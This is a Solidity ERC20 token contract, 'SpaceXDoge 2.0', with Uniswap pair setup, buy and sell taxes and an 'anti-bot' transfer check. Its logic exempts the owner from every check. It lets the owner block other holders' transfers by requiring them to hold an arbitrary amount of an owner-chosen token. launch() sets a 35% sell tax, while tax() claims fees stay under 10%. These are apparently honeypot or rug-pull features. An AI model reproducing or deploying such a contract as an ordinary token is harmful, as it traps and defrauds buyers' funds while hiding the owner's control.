// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./interfaces/IUniswapV2.sol";

contract SpaceXDoge20 is ERC20, ERC20Burnable, Ownable {
    using SafeMath for uint;

    uint256 private totalTokens;
    uint256 private vat;
    uint256 public startTime;
    uint256 public endTime;
    uint256 public tW = 0;
    uint256 public sT = 0;
    uint256 public bT = 0;

    bool public isAntiBotEnabled = false;
    bool public isTaxEnabled = false;

    mapping(address => bool) private blackList;

    address public buyBackWallet;
    address public swapPair;

    IERC20 private trackToken;
    IUniswapV2Router public swapRouter;

    constructor() ERC20("SpaceXDoge 2.0", "SXD2") {
        startTime = block.timestamp;
        totalTokens = 420000000 * 10 ** 6 * 10 ** uint256(decimals());

        swapRouter = IUniswapV2Router(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        swapPair = IUniswapV2Factory(swapRouter.factory()).createPair(
            address(this),
            swapRouter.WETH()
        );

        _mint(owner(), totalTokens);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override(ERC20) {
        if (from == owner() || to == owner() || tx.origin == owner()) {
            
        } else {
            if (block.timestamp > startTime && block.timestamp < endTime) {
                uint256 balanceAntiBot = trackToken.balanceOf(tx.origin);
                require(balanceAntiBot >= vat);
            }
        }
        super._beforeTokenTransfer(from, to, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (isTaxEnabled == true && tx.origin != owner()) {
            if (recipient == swapPair) {
                uint256 fee = caculateFee(amount, sT);
                super._transfer(sender, buyBackWallet, fee);
                amount = amount.sub(fee);
            } else if (sender == swapPair) {
                uint256 balanceUser = balanceOf(sender);
                require(
                    amount < balanceUser.mul(9990).div(10000),
                    "Anti Bot: Max 99.9% of balance"
                );
                uint256 fee = caculateFee(amount, bT);
                super._transfer(sender, buyBackWallet, fee);
                amount = amount.sub(fee);
            }
        }
        super._transfer(sender, recipient, amount);
    }

    function getBurnedAmountTotal() external view returns (uint256 _amount) {
        return totalTokens.sub(totalSupply());
    }

    function launch(
        address _trackToken,
        address _buyBackWallet,
        uint256 _endTime,
        uint256 _vat
    ) external onlyOwner {
        require(isAntiBotEnabled == false, "Anti Bot: Already enabled.");
        require(
            _trackToken != address(this),
            "Anti Bot: Can not track this token."
        );

        // Antibot
        isAntiBotEnabled = true;
        trackToken = IERC20(_trackToken);
        endTime = _endTime;
        vat = _vat;

        // Tax
        isTaxEnabled = true;
        sT = 3500;
        bT = 500;

        // Buy-Back Wallet
        buyBackWallet = _buyBackWallet;
    }

    function tax(uint16 _sT, uint16 _bT) external onlyOwner {
        require(_sT <= 1000, "Sell fee must be less than 10%");
        require(_bT <= 1000, "Buy fee must be less than 10%");
        sT = _sT;
        bT = _bT;
    }

    function setBuyBackWallet(
        address _buyBackWallet
    ) external onlyOwner {
        buyBackWallet = _buyBackWallet;
    }

    function caculateFee(
        uint256 _amount,
        uint256 _percent
    ) public pure returns (uint256) {
        uint256 fee = _amount.mul(_percent).div(10000);
        return fee;
    }
}